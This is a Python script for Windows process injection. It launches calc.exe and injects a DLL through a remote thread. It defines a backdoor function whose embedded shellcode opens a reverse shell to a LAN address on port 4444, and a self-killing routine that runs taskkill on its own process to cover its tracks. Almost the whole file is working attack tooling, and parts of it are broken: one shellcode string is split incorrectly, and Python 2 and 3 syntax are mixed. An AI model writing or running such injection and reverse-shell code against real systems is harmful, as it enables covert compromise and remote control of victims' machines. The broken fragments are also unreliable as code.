import sys
from ctypes import *
from my_debugger_defines import *

PAGE_READWRITE     =     0x04
PROCESS_ALL_ACCESS =     ( 0x000F0000 | 0x00100000 | 0xFFF )
VIRTUAL_MEM        =     ( 0x1000 | 0x2000 )

MODE_DLL_INJECT    = 1
MODE_CODE_INJECT   = 0 

kernel32 = windll.kernel32

def create_process(path_to_exe):
    pid                     = 0
    creation_flags          = CREATE_NEW_CONSOLE

    process_information     = PROCESS_INFORMATION()
    startupinfo             = STARTUPINFO()
    startupinfo.cb          = sizeof(startupinfo)
    startupinfo.dwFlags     = 0x1
    startupinfo.wShowWindow = 0x0

    if kernel32.CreateProcessA(path_to_exe,
                               None,
                               None,
                               None,
                               None,
                               creation_flags,
                               None,
                               None,
                               byref(startupinfo),
                               byref(process_information)):
        pid = process_information.dwProcessId
        print("[*] We have successfully launched the process!")
        print("[*] PID: %d" % process_information.dwProcessId)
    else:
        print("[*] Error: 0x%08x." % kernel32.GetLastError())
    return pid

def inject(pid, data, parameter=MODE_CODE_INJECT):
    h_process = kernel32.OpenProcess( PROCESS_ALL_ACCESS, False, int(pid) )

    if not h_process:
        print("[*] Unable to acquire handle to PID %s" % pid)
        sys.exit(0)



    # Allocate some space for the DLL path
    len_data = len(data)
    arg_address = kernel32.VirtualAllocEx( h_process, 0, len_data, VIRTUAL_MEM, PAGE_READWRITE)

    # Write the DLL path into the allocated space
    written = c_int(0)
    kernel32.WriteProcessMemory(h_process, arg_address, data, len_data, byref(written))

    if parameter == MODE_DLL_INJECT:
        # We need to resolve the address for LoadLibraryA
        h_kernel32 = kernel32.GetModuleHandleA("kernel32.dll")
        #My previous mistake
        #h_loadlib  = kernel32.GetProcAddress(h_kernel32, "LoadlibraryA")
        start_address  = kernel32.GetProcAddress(h_kernel32,"LoadLibraryA")
        parameter = arg_address
    else:
        start_address = arg_address


    thread_id = c_ulong(0)
    if not kernel32.CreateRemoteThread(h_process,None,0,start_address,parameter,0,byref(thread_id)):
        print("[*] Failed to inject the DLL. Exiting.")
        sys.exit(0)

    print "[*] Remote thread successfully created with a thread ID of: 0x%08x" % thread_id.value
    #print "[*] VNC Connection now open and ready for action...."
def backdoor(pid):
    connect_back_shellcode =\
    "\xfc\x6a\xeb\x4d\xe8\xf9\xff\xff\xff\x60\x8b\x6c\x24\x24\x8b\x45" \
    "\x3c\x8b\x7c\x05\x78\x01\xef\x8b\x4f\x18\x8b\x5f\x20\x01\xeb\x49" \
    "\x8b\x34\x8b\x01\xee\x31\xc0\x99\xac\x84\xc0\x74\x07\xc1\xca\x0d" \
    "\x01\xc2\xeb\xf4\x3b\x54\x24\x28\x75\xe5\x8b\x5f\x24\x01\xeb\x66" \
    "\x8b\x0c\x4b\x8b\x5f\x1c\x01\xeb\x03\x2c\x8b\x89\x6c\x24\x1c\x61" \
    "\xc3\x31\xdb\x64\x8b\x43\x30\x8b\x40\x0c\x8b\x70\x1c\xad\x8b\x40" \
    "\x08\x5e\x68\x8e\x4e\x0e\xec\x50\xff\xd6\x66\x53\x66\x68\x33\x32" \
    "\x68\x77\x73\x32\x5f\x54\xff\xd0\x68\xcb\xed\xfc\x3b\x50\xff\xd6" \
    "\x5f\x89\xe5\x66\x81\xed\x08\x02\x55\x6a\x02\xff\xd0\x68\xd9\x09" \
    "\xf5\xad\x57\xff\xd6\x53\x53\x53\x53\x43\x53\x43\x53\xff\xd0\x68" \
    "\xc0\xa8\xf4\x01\x66\x68\x11\x5c\x66\x53\x89\xe1\x95\x68\xec\xf9" \
    "\xaa\x60\x57\xff\xd6\x6a\x10\x51\x55\xff\xd0\x66\x6a\x64\x66\x68" \
    "\x63\x6d\x6a\x50\x59\x29\xcc\x89\xe7\x6a\x44\x89\xe2\x31\xc0\xf3" \
    "\xaa\x95\x89\xfd\xfe\x42\x2d\xfe\x42\x2c\x8d\x7a\x38\xab\xab\xab" \
    "\x68\x72\xfe\xb3\x16\xff\x75\x28\xff\xd6\x5b\x57\x52\x51\x51\x51" \
    "\x6a\x01\x51\x51\x55\x51\xff\xd0\x68\xad\xd9\x05\xce\x53\xff\xd6" \

    inject(pid, connect_back_shellcode)

def suicide():
    process_killer_shellcode = \
    "\xfc\xe8\x44\x00\x00\x00\x8b\x45\x3c\x8b\x7c\x05\x78\x01\xef\x8b"
    "\x4f\x18\x8b\x5f\x20\x01\xeb\x49\x8b\x34\x8b\x01\xee\x31\xc0\x99"
    "\xac\x84\xc0\x74\x07\xc1\xca\x0d\x01\xc2\xeb\xf4\x3b\x54\x24\x04"
    "\x75\xe5\x8b\x5f\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5f\x1c\x01\xeb"
    "\x8b\x1c\x8b\x01\xeb\x89\x5c\x24\x04\xc3\x31\xc0\x64\x8b\x40\x30"
    "\x85\xc0\x78\x0c\x8b\x40\x0c\x8b\x70\x1c\xad\x8b\x68\x08\xeb\x09"
    "\x8b\x80\xb0\x00\x00\x00\x8b\x68\x3c\x5f\x31\xf6\x60\x56\x89\xf8"
    "\x83\xc0\x7b\x50\x68\xef\xce\xe0\x60\x68\x98\xfe\x8a\x0e\x57\xff"
    "\xe7\x63\x6d\x64\x2e\x65\x78\x65\x20\x2f\x63\x20\x74\x61\x73\x6b"
    "\x6b\x69\x6c\x6c\x20\x2f\x50\x49\x44\x20\x41\x41\x41\x41\x00"

    our_pid = str(kernel32.GetCurrentProcessId())
    padding = 4 - len(our_pid)
    replace_value = our_pid + ('\x00' * padding)
    replace_string= '\x41' * 4
    process_killer_shellcode =\
            process_killer_shellcode.replace(replace_string, 
                    replace_value)
    inject(our_pid, process_killer_shellcode)

path_to_exe = 'C:\\Windows\\system32\\calc.exe'
dll_path    = 'ghp_inject.dll'
pid = create_process(path_to_exe)
if pid:
    inject(pid, dll_path, parameter=MODE_DLL_INJECT)
else:
    print("[*] Failed to find the process")
suicide()
